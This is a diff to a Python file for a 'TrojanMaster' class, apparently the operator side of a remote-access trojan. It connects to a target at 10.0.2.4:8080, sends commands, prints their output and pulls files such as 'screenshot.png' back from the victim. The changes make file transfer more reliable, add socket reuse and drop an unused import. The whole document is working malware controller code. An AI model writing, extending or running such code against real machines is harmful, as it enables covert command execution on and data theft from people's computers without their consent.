@@ -1,7 +1,5 @@
 import socket, sys, threading
 
-from cme.connection import connection
-
 
 class TrojanMaster(threading.Thread):
     def __init__(self, conf_dict):
@@ -13,24 +11,30 @@ class TrojanMaster(threading.Thread):
         self.received_message = None
         try:
             self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             self.connection.connect((self.target_host, self.target_port))
             print("Connection established with %s:%d" % (self.target_host, self.target_port))
         except socket.error as e:
             print("Connection failed with error %s" % e)
-
 
     def send_message(self, message=None):
         self.connection.sendto(message.encode(), (self.target_host, self.target_port))
         # print("sent message: ", message)
 
     def receive_message(self):
-        self.received_message = self.connection.recv(self.int_buff)
-        # print("received message: ", self.received_message.decode())
-        return self.received_message.decode()
+        self.received_message = self.connection.recv(self.int_buff).decode()
+        print("received message: ", self.received_message)
+        return self.received_message
 
     def receive_file(self, filename="screenshot.png"):
         with open(filename, "wb") as f:
-            f = self.connection.recv(self.int_buff)
+            while True:
+                data = self.connection.recv(self.int_buff)
+                if len(data) < self.int_buff:
+                    f.write(data)
+                    break
+                else:
+                    f.write(data)
         print("Received file: %s" % filename)
         return filename
 
@@ -52,12 +56,12 @@ class TrojanMaster(threading.Thread):
                 self.send_message(command)
                 print(self.receive_message())
 
-
     def run(self):
         self.trojan_logic()
 
     def close(self):
         self.connection.close()
+
 
 def main():
     conf_dict = {"target_host": "10.0.2.4", "target_port": 8080}
